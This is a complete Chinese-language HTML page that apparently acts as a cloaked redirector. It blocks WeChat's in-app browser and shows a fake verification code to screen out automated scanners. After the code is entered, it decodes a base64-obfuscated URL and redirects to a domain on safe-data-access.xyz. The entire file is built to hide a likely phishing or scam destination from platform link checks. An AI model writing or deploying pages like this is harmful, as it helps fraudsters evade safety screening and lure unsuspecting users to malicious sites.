<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>正在加载</title>
  <style>
    body {
      margin: 0;
      background-color: #1f2a36;
      color: #ffffff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 100px 20px;
    }
    .hidden { display: none; }
    .lock-icon {
      font-size: 80px;
      color: #f85c5c;
      margin-bottom: 30px;
    }
    .message {
      font-size: 20px;
      margin-bottom: 20px;
    }
    .code-display {
      font-size: 36px;
      color: #ff5555;
      margin-bottom: 20px;
    }
    input[type="text"] {
      padding: 15px;
      font-size: 20px;
      width: 180px;
      border: none;
      border-radius: 5px;
      margin-bottom: 15px;
      text-align: center;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      background-color: #00c292;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    #error {
      color: red;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div id="wechat-warning" class="hidden">
    <div class="lock-icon">🔒</div>
    <div class="message">请使用手机浏览器打开此页面</div>
  </div>

  <div id="verify-box" class="hidden">
    <div class="lock-icon">🔒</div>
    <div class="message">请输入下方验证码继续</div>
    <div class="code-display" id="show-code">----</div>
    <input type="text" id="code-input" maxlength="4" placeholder="验证码">
    <br>
    <button onclick="checkCode()">确定</button>
    <div id="error"></div>
  </div>

  <script>
    function isWeChat() {
      return /micromessenger/i.test(navigator.userAgent);
    }

    const generatedCode = Math.floor(1000 + Math.random() * 9000).toString();
    const encodedLink = "cGNrZHFodHRwczovL2NjeHgtaHVqZy1vb2pkdGh2LnNhZmUtZGF0YS1hY2Nlc3MueHl6ZmRzOA=="; // 示例加密
    const prefixLength = 5;
    const suffixLength = 4;

    function decodeUrl(encoded) {
      try {
        const decoded = atob(encoded);
        return decoded.slice(prefixLength, -suffixLength);
      } catch {
        return null;
      }
    }

    function checkCode() {
      const input = document.getElementById("code-input").value.trim();
      if (input === generatedCode) {
        document.getElementById("error").innerText = "";
        const realUrl = decodeUrl(encodedLink);
        if (realUrl) window.location.href = realUrl;
        else document.getElementById("error").innerText = "加载失败，链接损坏";
      } else {
        document.getElementById("error").innerText = "验证码错误，请重试";
      }
    }

    window.onload = function () {
      if (isWeChat()) {
        document.getElementById("wechat-warning").classList.remove("hidden");
      } else {
        document.getElementById("verify-box").classList.remove("hidden");
        document.getElementById("show-code").innerText = generatedCode;
      }
    };
  </script>
</body>
</html>
